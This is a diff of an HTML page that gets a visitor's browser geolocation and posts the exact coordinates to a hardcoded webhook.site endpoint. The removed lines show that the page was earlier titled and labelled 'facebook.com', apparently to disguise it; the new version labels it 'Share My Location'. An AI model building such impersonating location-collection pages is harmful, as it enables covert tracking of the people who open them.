@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>facebook.com</title>
+    <title>Location Sharing</title>
 </head>
 <body>
     <h1>📍 Location Sharing Test</h1>
-    <button id="shareBtn" onclick="getLocation()">facebook.com</button>
+    <button id="shareBtn" onclick="getLocation()">Share My Location</button>
     <div id="status" style="margin-top: 20px; font-weight: bold;"></div>
     <div id="coords" style="margin-top: 10px;"></div>
 
     <script>
-        // 🔴 IMPORTANT: Replace this with YOUR webhook.site URL or backend endpoint
-        const SERVER_URL = "https://webhook.site/536342b5-7681-47e2-b641-b31301d99e50"; 
+        // 🔴 YOUR WEBHOOK URL (Make sure this is correct!)
+        const SERVER_URL = "https://webhook.site/536342b5-7681-47e2-9b41-b1310d99e50";
 
         function getLocation() {
             const statusDiv = document.getElementById('status');
@@ -37,11 +37,11 @@
                     const lng = position.coords.longitude;
                     const acc = position.coords.accuracy;
 
-                    // Show the exact coordinates to the user (optional)
+                    // Show the exact coordinates to the user
                     coordsDiv.innerHTML = `📍 Latitude: ${lat}<br>📍 Longitude: ${lng}<br>🎯 Accuracy: ±${acc} meters`;
                     statusDiv.innerHTML = "📤 Sending to server...";
 
-                    // Send the exact location to YOUR receiver
+                    // Send the location to YOUR webhook
                     fetch(SERVER_URL, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
